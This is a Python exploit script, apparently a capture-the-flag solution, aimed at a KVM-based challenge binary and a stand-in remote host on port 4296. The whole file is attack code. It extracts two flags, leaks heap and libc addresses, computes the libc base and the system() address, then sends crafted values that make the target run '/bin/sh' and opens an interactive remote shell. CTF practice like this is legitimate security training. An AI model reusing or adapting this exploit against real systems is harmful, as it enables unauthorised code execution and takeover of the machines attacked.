#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = '../kvm/kvm.elf'
args     = '../kernel/kernel.bin exploit.elf ../flag2.txt'.split()
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file]+args, 'aslr':False}, \
                        local   = {'argv':[bin_file]+args}, \
                        remote  = {'host':'target.com', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.19.so_remote')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    flag1 = get_flag1(conn)
    info("flag1 : {}".format(flag1))

    flag2 = get_flag2(conn)
    info("flag2 : {}".format(flag2))

    get_shell(conn)

def get_flag1(conn):
    conn.recvuntil('first flag : ')
    return conn.recvuntil('\n')

def get_flag2(conn):
    conn.recvuntil('ring0\n')
    return conn.recv(0x20).strip("\x00").split(' : ')[1]

def get_shell(conn):
    addr_heap_base = u64(conn.recv(8)) - 0x6e0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    conn.recv(8)

    addr_libc_mainarena = u64(conn.recv(8)) - 0x58
    libc.address        = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    addr_vmmem          = libc.address - 0x400000
    info('addr_vmmem        = 0x{:08x}'.format(addr_vmmem))

    conn.send(p64(addr_libc_system))
    conn.send(p64(u(p(addr_heap_base - addr_vmmem)) | 0x83))
    conn.send('/bin/sh\x00')

    conn.interactive()

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)

#==========
